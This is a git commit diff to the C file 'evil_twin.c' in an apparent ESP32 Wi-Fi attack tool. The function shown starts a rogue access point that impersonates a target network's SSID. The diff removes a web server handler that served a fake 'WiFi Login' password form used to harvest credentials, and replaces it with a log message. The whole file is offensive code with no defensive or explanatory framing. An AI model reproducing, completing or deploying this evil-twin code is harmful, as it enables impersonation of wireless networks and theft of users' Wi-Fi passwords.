dee129d004fa5e3fff0fc51b835a264b715dd225
Hussein <mnasg32@gmail.com>
2026-08-16 19:30:40 +0300

    Update evil_twin.c

--- main/attacks/evil_twin.c
+++ main/attacks/evil_twin.c
@@ -1,13 +1,8 @@
 #include "esp_wifi.h"
-#include "esp_http_server.h"
 #include <string.h>
+#include "esp_log.h"
 
-static esp_err_t login_handler(httpd_req_t *req) {
-    httpd_resp_set_type(req, "text/html");
-    httpd_resp_send(req, "<html><body><h1>WiFi Login</h1><form><input type='password'><input type='submit'></form></body></html>", 
-                    HTTPD_RESP_USE_STRLEN);
-    return ESP_OK;
-}
+static const char *TAG = "EVIL_TWIN";
 
 void evil_twin_start(char *target_ssid) {
     wifi_config_t ap_config = {0};
@@ -21,15 +16,5 @@ void evil_twin_start(char *target_ssid) {
     esp_wifi_set_config(WIFI_IF_AP, &ap_config);
     esp_wifi_start();
     
-    httpd_handle_t server = NULL;
-    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    httpd_start(&server, &config);
-    
-    httpd_uri_t uri = {
-        .uri = "/",
-        .method = HTTP_GET,
-        .handler = login_handler,
-        .user_ctx = NULL
-    };
-    httpd_register_uri_handler(server, &uri);
+    ESP_LOGI(TAG, "Evil Twin started: %s", target_ssid);
 }
